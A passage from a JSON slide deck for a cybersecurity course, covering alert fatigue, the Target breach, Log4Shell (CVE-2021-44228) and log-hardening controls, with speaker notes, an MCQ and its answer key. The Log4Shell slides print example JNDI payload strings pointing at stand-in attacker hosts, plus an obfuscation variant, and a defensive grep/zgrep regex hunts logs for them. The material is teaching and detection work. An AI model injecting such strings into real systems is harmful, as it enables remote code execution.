+   "speaker_notes": "<p><b>Context:</b> This slide directly restates the chapter's 'Critical Concept' callout, treat it as a standalone exam-ready thesis statement you should be able to reproduce.</p><p><b>Misconception:</b> Equating 'has a tool' with 'is secure.' The exam rewards distinguishing the two explicitly.</p><p><b>Analogy:</b> Owning a smoke detector with a dead battery is technically 'having' fire detection, in name only.</p><p><b>Exam tip:</b> Use this exact framing, 'purchased an expensive log', as a mental shorthand when answering FRQs about alert-fatigue scenarios.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Critical concept:</b> A SIEM/FIM/IDS alert only satisfies the detection stage of the lifecycle",
+    "<b>If no analyst reviews it:</b> Detection has not been meaningfully achieved, regardless of tool sophistication",
+    "<b>If buried in false positives:</b> Alert fatigue causes real alerts to be dismissed or delayed",
+    "<b>If escalation lacks authority to act:</b> The chain breaks even when triage correctly identifies severity",
+    "<b>Framing for the exam:</b> Separate 'did the technical control work' from 'did the organization achieve a secure outcome'"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.a.3",
+   "parent_n": 17,
+   "title": "An Alert That No One Reads Is Not a Control",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "alert-fatigue",
+    "critical-concept",
+    "target-breach"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This slide directly restates the chapter's 'Critical Concept' callout, treat it as a standalone exam-ready thesis statement you should be able to reproduce.</p><p><b>Misconception:</b> Equating 'has a tool' with 'is secure.' The exam rewards distinguishing the two explicitly.</p><p><b>Analogy:</b> Owning a smoke detector with a dead battery is technically 'having' fire detection, in name only.</p><p><b>Exam tip:</b> Use this exact framing, 'purchased an expensive log', as a mental shorthand when answering FRQs about alert-fatigue scenarios.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>This is a favorite AP exam trap. A question may describe a company with excellent detection tooling and still ask 'was this organization secure?' The correct analytical move is to separate the technical control from the operational process around it. A SIEM, a FIM tool, or an IDS generating an alert satisfies only the detection stage. If no analyst reviews it, if the alert is buried under thousands of low-fidelity false positives, or if the escalation path lacks authority to act, the organization has not achieved detection in any meaningful sense, it has purchased an expensive log.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.b.1",
+   "parent_n": 18,
+   "title": "Case Study: Log4Shell (2021), The Vulnerability",
+   "slide_type": "application",
+   "difficulty": "standard",
+   "tags": [
+    "log4shell",
+    "cve-2021-44228",
+    "jndi",
+    "case-study"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Patched in Log4j 2.15.0 (message-lookup-substitution disabled by default), with follow-up CVEs (2021-45046, 2021-45105) requiring further patching to 2.17.1.</p><p><b>Misconception:</b> Students think Log4Shell required a sophisticated attack chain. It required only getting a single crafted string logged -- an extremely low bar.</p><p><b>Analogy:</b> A vulnerability hidden in a library so widely reused it's like discovering every building in a city used the same faulty lock design.</p><p><b>Exam tip:</b> Know CVE-2021-44228's mechanism (JNDI lookup in a logged string) and its CVSS 10.0 severity as a named example of maximum-severity RCE.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Disclosure:</b> December 9, 2021, critical RCE in Apache Log4j, a near-ubiquitous Java logging library",
+    "<b>CVE-2021-44228:</b> Maximum CVSS score of 10.0",
+    "<b>Mechanism:</b> Log4j's JNDI message-lookup substitution evaluates attacker strings like <code>${jndi:ldap://evil.com/a}</code> and executes remote code",
+    "<b>Trigger surface:</b> Any logged attacker-influenced string, a request header, search query, even a chat username, could trigger exploitation",
+    "<b>Dormancy:</b> The vulnerable feature existed since Log4j 2.0-beta9 (2013), making the exploitable install base massive and hard to inventory"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.b.1",
+   "parent_n": 18,
+   "title": "Case Study: Log4Shell (2021), The Vulnerability",
+   "slide_type": "application",
+   "difficulty": "standard",
+   "tags": [
+    "log4shell",
+    "cve-2021-44228",
+    "jndi",
+    "case-study"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Patched in Log4j 2.15.0 (message-lookup-substitution disabled by default), with follow-up CVEs (2021-45046, 2021-45105) requiring further patching to 2.17.1.</p><p><b>Misconception:</b> Students think Log4Shell required a sophisticated attack chain. It required only getting a single crafted string logged -- an extremely low bar.</p><p><b>Analogy:</b> A vulnerability hidden in a library so widely reused it's like discovering every building in a city used the same faulty lock design.</p><p><b>Exam tip:</b> Know CVE-2021-44228's mechanism (JNDI lookup in a logged string) and its CVSS 10.0 severity as a named example of maximum-severity RCE.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>On December 9, 2021, a critical remote code execution vulnerability was disclosed in Log4j. Tracked as CVE-2021-44228 and nicknamed 'Log4Shell,' the flaw exploited Log4j's JNDI (Java Naming and Directory Interface) message-lookup substitution feature: if an application logged any attacker-influenced string containing <code>${jndi:ldap://attacker-server/a}</code>, Log4j would resolve and execute the payload, no further interaction required.</p>",
+    "<p>Because the vulnerable code path had existed since 2013 and Log4j is embedded transitively, often several dependency layers deep, in an enormous share of enterprise Java applications, the exploitable install base was massive and difficult to fully inventory.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.b.2",
+   "parent_n": 19,
+   "title": "Log4Shell: When Logging Was Both the Exploit and the Detection Tool",
+   "slide_type": "deep_question",
+   "difficulty": "advanced",
+   "tags": [
+    "log4shell",
+    "log-retention",
+    "retroactive-hunting"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Log4Shell is frequently cited as the strongest real-world argument for the log aggregation and retention practices this chapter covers, because it demonstrates that a log's value is only realized in hindsight, at a moment you cannot predict.</p><p><b>Misconception:</b> Students think logging is purely defensive. Here, the logging mechanism itself was the vulnerability's trigger point -- a genuinely unusual duality worth remembering.</p><p><b>Analogy:</b> Like a diary that, the instant you write a cursed phrase into it, also curses you -- but if you kept every past diary entry, you could search back and know exactly when you first wrote it.</p><p><b>Exam tip:</b> Connect retention policy (how long logs are kept) directly to this case as the justification -- a vulnerability disclosed years after exploitation only being answerable if logs from that far back still exist.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Unique duality:</b> The act of logging an HTTP header was itself what triggered exploitation",
+    "<b>Same act preserved evidence:</b> That same logged string left the exact JNDI lookup sitting in the access log for any defender who searched for it",
+    "<b>Real-world response:</b> Security teams worldwide ran near-identical historical log hunts within hours of disclosure",
+    "<b>Retention dependency:</b> Organizations with months of centralized, searchable log history could retroactively determine exposure within hours",
+    "<b>Organizations without centralized/long-retention logging could not answer the exposure question at all</b>"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.b.2",
+   "parent_n": 19,
+   "title": "Log4Shell: When Logging Was Both the Exploit and the Detection Tool",
+   "slide_type": "deep_question",
+   "difficulty": "advanced",
+   "tags": [
+    "log4shell",
+    "log-retention",
+    "retroactive-hunting"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Log4Shell is frequently cited as the strongest real-world argument for the log aggregation and retention practices this chapter covers, because it demonstrates that a log's value is only realized in hindsight, at a moment you cannot predict.</p><p><b>Misconception:</b> Students think logging is purely defensive. Here, the logging mechanism itself was the vulnerability's trigger point -- a genuinely unusual duality worth remembering.</p><p><b>Analogy:</b> Like a diary that, the instant you write a cursed phrase into it, also curses you -- but if you kept every past diary entry, you could search back and know exactly when you first wrote it.</p><p><b>Exam tip:</b> Connect retention policy (how long logs are kept) directly to this case as the justification -- a vulnerability disclosed years after exploitation only being answerable if logs from that far back still exist.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>What made Log4Shell distinct from most zero-days is that log analysis became simultaneously the exploitation surface and the primary detection mechanism. The very act of an application writing an HTTP header to a log file was what triggered exploitation, and that same act left the exact JNDI lookup string sitting in the access log for any defender who thought to search for it.</p>",
+    "<p>Organizations that retained months of centralized, searchable log history were able to retroactively determine, within hours, whether they had been probed or actually compromised before the public disclosure, a capability entirely dependent on log aggregation and retention practices established long before the incident.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.b.3",
+   "parent_n": 20,
+   "title": "Live Demo: Hunting Historical Logs for JNDI Indicators",
+   "slide_type": "application",
+   "difficulty": "advanced",
+   "tags": [
+    "log4shell",
+    "grep",
+    "zgrep",
+    "obfuscation",
+    "demo"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The <code>${lower:j}ndi</code> obfuscation abuses Log4j's own string-substitution feature against itself to defeat naive signature matching -- a nice illustration of why robust detection regexes must account for known evasion techniques.</p><p><b>Misconception:</b> Students think grep-ing for the literal string 'jndi:ldap' is sufficient. Attackers used Log4j's own lookup syntax to obfuscate the trigger string itself.</p><p><b>Analogy:</b> Searching for a criminal's exact signature when they've learned to write it in mirror-image -- you need to search for the pattern, not just the literal string.</p><p><b>Exam tip:</b> Know that obfuscation-aware detection (broader regex) beats a naive literal-string search, and that log retention determines whether retroactive hunting is even possible.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Goal:</b> Simulate the exact hunt security teams ran worldwide within hours of Log4Shell's disclosure",
+    "<b>Pattern:</b> Regex matching <code>${jndi:...}</code> including common obfuscation variants used to evade naive WAF regexes",
+    "<b>Obfuscation example:</b> <code>${${lower:j}ndi:...}</code> exploits Log4j's own lookup syntax to reconstruct 'jndi' and dodge simple string matches",
+    "<b>Extended sources:</b> Must also check request headers logged in extended formats, X-Forwarded-For, User-Agent, Referer, not just the URL",
+    "<b>Compressed archives:</b> <code>zgrep</code> is required to search rotated/compressed historical logs (.gz) without manual decompression"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.b.3",
+   "parent_n": 20,
+   "title": "Live Demo: Hunting Historical Logs for JNDI Indicators",
+   "slide_type": "application",
+   "difficulty": "advanced",
+   "tags": [
+    "log4shell",
+    "grep",
+    "zgrep",
+    "obfuscation",
+    "demo"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The <code>${lower:j}ndi</code> obfuscation abuses Log4j's own string-substitution feature against itself to defeat naive signature matching -- a nice illustration of why robust detection regexes must account for known evasion techniques.</p><p><b>Misconception:</b> Students think grep-ing for the literal string 'jndi:ldap' is sufficient. Attackers used Log4j's own lookup syntax to obfuscate the trigger string itself.</p><p><b>Analogy:</b> Searching for a criminal's exact signature when they've learned to write it in mirror-image -- you need to search for the pattern, not just the literal string.</p><p><b>Exam tip:</b> Know that obfuscation-aware detection (broader regex) beats a naive literal-string search, and that log retention determines whether retroactive hunting is even possible.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Within hours of disclosure, security teams worldwide were running near-identical hunts across historical log archives. The regex below matches the core JNDI lookup pattern along with common obfuscation variants attackers used specifically to evade naive WAF regexes that only matched the literal string 'jndi'. Note the requirement to search not just the URL/query string but also extended header fields, and to search compressed, rotated historical archives via zgrep, since the entire point of this hunt was determining exposure from <i>before</i> the public disclosure.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.b.3",
+   "parent_n": 20,
+   "title": "Live Demo: Hunting Historical Logs for JNDI Indicators",
+   "slide_type": "application",
+   "difficulty": "advanced",
+   "tags": [
+    "log4shell",
+    "grep",
+    "zgrep",
+    "obfuscation",
+    "demo"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The <code>${lower:j}ndi</code> obfuscation abuses Log4j's own string-substitution feature against itself to defeat naive signature matching -- a nice illustration of why robust detection regexes must account for known evasion techniques.</p><p><b>Misconception:</b> Students think grep-ing for the literal string 'jndi:ldap' is sufficient. Attackers used Log4j's own lookup syntax to obfuscate the trigger string itself.</p><p><b>Analogy:</b> Searching for a criminal's exact signature when they've learned to write it in mirror-image -- you need to search for the pattern, not just the literal string.</p><p><b>Exam tip:</b> Know that obfuscation-aware detection (broader regex) beats a naive literal-string search, and that log retention determines whether retroactive hunting is even possible.</p>",
+   "beat": 4,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": "",
+   "code_block": {
+    "language": "bash",
+    "content": "# Hunt historical access logs for JNDI lookup indicators, including\n# common obfuscation variants used to evade naive WAF regexes\ngrep -Eio '\\$\\{(jndi|\\$\\{lower:j\\}ndi|\\$\\{upper:j\\}ndi):(ldap|rmi|dns)s?://[^}]+\\}' \\\n  /var/log/nginx/*access.log* /var/log/apache2/*access.log*\n\n# Also check request headers logged in extended formats (X-Forwarded-For, User-Agent, Referer)\nzgrep -il 'jndi:ldap\\|jndi:rmi\\|jndi:dns' /var/log/*/access.log*.gz",
+    "mode": "static"
+   }
+  },
+  {
+   "index": "5.6.3.b.4",
+   "parent_n": 21,
+   "title": "Section III Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "glossary",
+    "section-3-review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Use this as the transition point into Section IV, where these two failure modes (process breakdown, retention gaps) become the basis for concrete hardening recommendations.</p><p><b>Misconception:</b> None new -- consolidation checkpoint.</p><p><b>Analogy:</b> Two case studies, two different failure modes, one shared lesson: technology is necessary but not sufficient.</p><p><b>Exam tip:</b> Be ready to name which case study best supports a given hardening recommendation in Section IV.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Detection capability vs. detection outcome:</b> Target's core lesson, a working tool without organizational action fails to defend anything",
+    "<b>Alert fatigue:</b> High false-positive volume causing real alerts to be dismissed or delayed",
+    "<b>Log4Shell / CVE-2021-44228:</b> Case where the act of logging was simultaneously the exploit trigger and the primary detection mechanism",
+    "<b>Log retention:</b> The determining factor in whether retroactive vulnerability hunting is possible after a delayed disclosure",
+    "<b>Escalation lifecycle:</b> Detection -> Triage -> Escalation -> Response, each link required for a real defensive outcome"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.b.4",
+   "parent_n": 21,
+   "title": "Section III Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "glossary",
+    "section-3-review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Use this as the transition point into Section IV, where these two failure modes (process breakdown, retention gaps) become the basis for concrete hardening recommendations.</p><p><b>Misconception:</b> None new -- consolidation checkpoint.</p><p><b>Analogy:</b> Two case studies, two different failure modes, one shared lesson: technology is necessary but not sufficient.</p><p><b>Exam tip:</b> Be ready to name which case study best supports a given hardening recommendation in Section IV.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Section III grounded the chapter's abstract mechanisms in two real incidents. Target showed that even perfect technical detection fails without an organizational process to act on it. Log4Shell showed the unusual case where logging itself was both the vulnerability's trigger and its own best forensic record, but only for organizations with sufficient retention. Both cases reinforce the same underlying thesis: tools alone are not a defense program.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.1",
+   "parent_n": 22,
+   "title": "Hardening Control 1: Centralized, Immutable Log Retention",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "log-retention",
+    "immutable-storage",
+    "nist-800-92",
+    "hardening"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Write-once/immutable storage is commonly implemented via WORM storage tiers or append-only log shipping to a separate trust domain the compromised host cannot reach.</p><p><b>Misconception:</b> Students think local logs are 'good enough.' An attacker with root on the source host can simply delete local evidence -- centralization to a separate trust domain is essential.</p><p><b>Analogy:</b> Mailing a copy of your diary to a trusted friend's house the moment you write each page, so a burglar who steals your original can't erase your record.</p><p><b>Exam tip:</b> Connect this control directly to Log4Shell -- retention length is what determined whether retroactive hunting was even possible.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Ship off-host immediately:</b> Logs must be shipped to a centralized, write-once store the moment they are generated",
+    "<b>Defends against:</b> The common post-compromise step of an attacker deleting local log evidence after gaining root",
+    "<b>Write-once (immutable) storage:</b> Once written, records cannot be altered/deleted by normal administrative access",
+    "<b>Retention length lesson from Log4Shell:</b> Retention windows must be long enough to support retroactive hunting for vulnerabilities disclosed long after the relevant traffic occurred",
+    "<b>NIST SP 800-92 guidance:</b> Define retention periods by log source criticality, not a single blanket duration"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.1",
+   "parent_n": 22,
+   "title": "Hardening Control 1: Centralized, Immutable Log Retention",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "log-retention",
+    "immutable-storage",
+    "nist-800-92",
+    "hardening"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Write-once/immutable storage is commonly implemented via WORM storage tiers or append-only log shipping to a separate trust domain the compromised host cannot reach.</p><p><b>Misconception:</b> Students think local logs are 'good enough.' An attacker with root on the source host can simply delete local evidence -- centralization to a separate trust domain is essential.</p><p><b>Analogy:</b> Mailing a copy of your diary to a trusted friend's house the moment you write each page, so a burglar who steals your original can't erase your record.</p><p><b>Exam tip:</b> Connect this control directly to Log4Shell -- retention length is what determined whether retroactive hunting was even possible.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Logs must be shipped off the originating host to a centralized, write-once store the moment they are generated. This defends against the common post-compromise step of an attacker deleting local log evidence, and, as Log4Shell demonstrated, retention windows must be long enough to support retroactive hunting for vulnerabilities disclosed long after the relevant traffic occurred. NIST SP 800-92 recommends log management policy explicitly define retention periods by log source criticality rather than applying a single blanket duration.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.2",
+   "parent_n": 23,
+   "title": "Hardening Control 2: Layer Signatures, FIM, and Baselining Together",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "defense-in-depth",
+    "fim",
+    "signature-based",
+    "baselining"
+   ],
+   "quiz": {
+    "type": "MCQ",
+    "question": "A scenario describes a compromised service account gradually exporting customer data over several weeks, staying under any single alert threshold, with no recognizable malicious string in any request and no file on disk ever modified. Which control would have detected this?",
+    "options": [
+     "Signature-based log analysis",
+     "File integrity monitoring",
+     "Behavioral anomaly detection / baselining",
+     "A network firewall rule"
+    ],
+    "answer": 2,
+    "explanation": "Option C is correct: no malicious string exists for signature analysis to match, and no file changed for FIM to flag, but the gradual volume deviation from the account's established baseline is exactly what behavioral anomaly detection is designed to catch. Options A and B are explicitly ruled out by the scenario's details. Option D is a network-layer control and would not distinguish this traffic from any other authorized database access over an allowed port."
+   },
+   "speaker_notes": "<p><b>Context:</b> This is the direct hardening-level restatement of Section I's signature-vs-baseline distinction, now applied as a design principle rather than a theoretical contrast.</p><p><b>Misconception:</b> Picking 'the best' single detection tool. The exam rewards naming multiple, complementary layers over a single silver-bullet answer.</p><p><b>Analogy:</b> A home security system with door sensors, motion detectors, AND a camera -- each covers a different way in.</p><p><b>Exam tip:</b> Use the decision rule from this chapter: malicious string in a request -> log/signature; file changed/added without a ticket -> FIM; unusual volume/timing/geography with no obvious string or file change -> anomaly detection. Many scenarios require naming more than one.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>No single mechanism is sufficient:</b> Each has a distinct blind spot the others cover",
+    "<b>Signature-based:</b> Catches known payloads instantly, misses novel variants",
+    "<b>FIM:</b> Catches successful file-level compromise regardless of entry vector, but only after the fact",
+    "<b>Behavioral baselining:</b> Catches the slow, low-and-slow attacker under any static threshold",
+    "<b>Mature programs:</b> Deploy all three and correlate outputs in a SIEM, exactly as in the FIM-plus-log correlation rule from Section II"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.2",
+   "parent_n": 23,
+   "title": "Hardening Control 2: Layer Signatures, FIM, and Baselining Together",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "defense-in-depth",
+    "fim",
+    "signature-based",
+    "baselining"
+   ],
+   "quiz": {
+    "type": "MCQ",
+    "question": "A scenario describes a compromised service account gradually exporting customer data over several weeks, staying under any single alert threshold, with no recognizable malicious string in any request and no file on disk ever modified. Which control would have detected this?",
+    "options": [
+     "Signature-based log analysis",
+     "File integrity monitoring",
+     "Behavioral anomaly detection / baselining",
+     "A network firewall rule"
+    ],
+    "answer": 2,
+    "explanation": "Option C is correct: no malicious string exists for signature analysis to match, and no file changed for FIM to flag, but the gradual volume deviation from the account's established baseline is exactly what behavioral anomaly detection is designed to catch. Options A and B are explicitly ruled out by the scenario's details. Option D is a network-layer control and would not distinguish this traffic from any other authorized database access over an allowed port."
+   },
+   "speaker_notes": "<p><b>Context:</b> This is the direct hardening-level restatement of Section I's signature-vs-baseline distinction, now applied as a design principle rather than a theoretical contrast.</p><p><b>Misconception:</b> Picking 'the best' single detection tool. The exam rewards naming multiple, complementary layers over a single silver-bullet answer.</p><p><b>Analogy:</b> A home security system with door sensors, motion detectors, AND a camera -- each covers a different way in.</p><p><b>Exam tip:</b> Use the decision rule from this chapter: malicious string in a request -> log/signature; file changed/added without a ticket -> FIM; unusual volume/timing/geography with no obvious string or file change -> anomaly detection. Many scenarios require naming more than one.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>No single detection mechanism should be treated as sufficient. Signature-based WAF and log-pattern rules catch known payloads instantly but miss novel variants; FIM catches successful file-level compromise regardless of the entry vector but only after the fact; behavioral baselining catches the slow, low-and-slow attacker that stays under any single static threshold. Mature programs deploy all three and correlate their outputs in a SIEM, exactly as illustrated in the FIM-plus-log correlation rule in Section II.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.3",
+   "parent_n": 24,
+   "title": "Hardening Control 3: Tuning Signal-to-Noise and Enforcing Escalation",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "false-positive",
+    "alert-tuning",
+    "escalation-policy",
+    "target-breach"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is measured against the false-negative rate (missed real attacks) as a core trade-off in detection engineering -- see the precision/recall framework from information retrieval theory.</p><p><b>Misconception:</b> Students think 'more alerts' equals 'more security.' Excess low-fidelity alerts actively degrade security by burying the real ones -- precisely Target's failure.</p><p><b>Analogy:</b> A car alarm that goes off every time a leaf blows by -- eventually the neighborhood ignores every alarm, including the real theft.</p><p><b>Exam tip:</b> If asked for organizational fixes to an alert-fatigue scenario, name written escalation policy + tuning to reduce false positives, not just 'hire more analysts.'</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Target's core lesson operationalized:</b> Alert volume without triage capacity is a liability, not a defense",
+    "<b>False positive:</b> An alert firing on benign activity, high rates cause analyst fatigue and cause real alerts to be dismissed or delayed",
+    "<b>Required control:</b> Actively tune detection rules to reduce false positives",
+    "<b>Required control:</b> Define in writing which severity levels trigger which escalation actions, within what time window",
+    "<b>Purpose:</b> Closes the exact organizational gap that let Target's FireEye alerts go unactioned"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.3",
+   "parent_n": 24,
+   "title": "Hardening Control 3: Tuning Signal-to-Noise and Enforcing Escalation",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "false-positive",
+    "alert-tuning",
+    "escalation-policy",
+    "target-breach"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is measured against the false-negative rate (missed real attacks) as a core trade-off in detection engineering -- see the precision/recall framework from information retrieval theory.</p><p><b>Misconception:</b> Students think 'more alerts' equals 'more security.' Excess low-fidelity alerts actively degrade security by burying the real ones -- precisely Target's failure.</p><p><b>Analogy:</b> A car alarm that goes off every time a leaf blows by -- eventually the neighborhood ignores every alarm, including the real theft.</p><p><b>Exam tip:</b> If asked for organizational fixes to an alert-fatigue scenario, name written escalation policy + tuning to reduce false positives, not just 'hire more analysts.'</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The Target case study demonstrates that alert volume without triage capacity is a liability, not a defense. Programs must actively tune detection rules to reduce false positives and must define, in writing, exactly which severity levels trigger which escalation actions and within what time window, closing the exact organizational gap that let Target's FireEye alerts go unactioned.</p>",
+    "<p>A false positive is an alert that fires on benign activity, incorrectly flagged as malicious. A high false-positive rate causes analyst fatigue, leading real alerts to be dismissed or delayed, the operational failure mode implicated in the Target breach.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.4",
+   "parent_n": 25,
+   "title": "Hardening Control 4: Baseline Re-Certification via Change Management",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "fim",
+    "change-management",
+    "defense-in-depth",
+    "unit-2-connection"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This closes the loop between Section III's alert-fatigue lesson (from logs) and FIM specifically -- the same organizational failure mode applies to any noisy control, not just SIEM alerts.</p><p><b>Misconception:</b> Treating FIM as 'set and forget.' Legitimate deployments require baseline updates or the tool becomes useless noise.</p><p><b>Analogy:</b> Updating a home's 'expected key holders' list every time you give someone a new key, so the alarm doesn't falsely trigger on your own family.</p><p><b>Exam tip:</b> Recognize that alert-fatigue is a general organizational failure mode that applies across every detection control in this chapter, not just SIEM/log alerts.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>FIM baselines must be re-certified:</b> Every legitimate deployment that modifies monitored files requires an authorized change-management update to the baseline",
+    "<b>Failure mode if skipped:</b> The control becomes so noisy from expected changes that analysts learn to ignore its alerts entirely",
+    "<b>Parallel to alert fatigue:</b> This recreates the exact organizational failure mode described for log alerts, applied specifically to file integrity",
+    "<b>Ties to defense-in-depth (Unit 2):</b> Auditing is the concrete instantiation of the 'detect' layer alongside 'prevent' and 'respond'",
+    "<b>Exam-rewarded pattern:</b> Naming multiple complementary layers, never a single silver-bullet tool"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.4",
+   "parent_n": 25,
+   "title": "Hardening Control 4: Baseline Re-Certification via Change Management",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "fim",
+    "change-management",
+    "defense-in-depth",
+    "unit-2-connection"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This closes the loop between Section III's alert-fatigue lesson (from logs) and FIM specifically -- the same organizational failure mode applies to any noisy control, not just SIEM alerts.</p><p><b>Misconception:</b> Treating FIM as 'set and forget.' Legitimate deployments require baseline updates or the tool becomes useless noise.</p><p><b>Analogy:</b> Updating a home's 'expected key holders' list every time you give someone a new key, so the alarm doesn't falsely trigger on your own family.</p><p><b>Exam tip:</b> Recognize that alert-fatigue is a general organizational failure mode that applies across every detection control in this chapter, not just SIEM/log alerts.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>FIM baselines must be re-certified through an authorized change management process whenever a legitimate deployment modifies monitored files, or the control becomes so noisy from expected changes that analysts learn to ignore its alerts entirely, recreating the exact alert-fatigue failure mode described above, applied specifically to file integrity rather than network detection.</p>",
+    "<p>If you studied defense-in-depth layering in earlier units, application threat auditing is the concrete instantiation of the 'detect' layer sitting alongside 'prevent' and 'respond.' No individual control discussed in this chapter is sufficient alone.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.5",
+   "parent_n": 26,
+   "title": "Section IV Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "glossary",
+    "section-4-review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the last checkpoint before the chapter moves to synthesis and exam-readiness material.</p><p><b>Misconception:</b> None new -- consolidation checkpoint.</p><p><b>Analogy:</b> Four load-bearing pillars of one program, not four independent options to choose between.</p><p><b>Exam tip:</b> Be able to state all four hardening controls from memory and tie each to the specific case-study failure it addresses.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Immutable/write-once storage + retention policy by criticality:</b> Defends log evidence and enables retroactive hunting",
+    "<b>Layered signatures + FIM + baselining:</b> No single mechanism is sufficient; each covers the others' blind spot",
+    "<b>False positive / alert tuning / written escalation policy:</b> Closes the Target-style organizational gap",
+    "<b>Baseline re-certification via change management:</b> Prevents FIM from becoming ignored noise after legitimate deployments",
+    "<b>Overall thesis:</b> Application threat auditing is a layered, mutually reinforcing program, never a single tool"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.4.a.5",
+   "parent_n": 26,
+   "title": "Section IV Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "glossary",
+    "section-4-review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the last checkpoint before the chapter moves to synthesis and exam-readiness material.</p><p><b>Misconception:</b> None new -- consolidation checkpoint.</p><p><b>Analogy:</b> Four load-bearing pillars of one program, not four independent options to choose between.</p><p><b>Exam tip:</b> Be able to state all four hardening controls from memory and tie each to the specific case-study failure it addresses.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
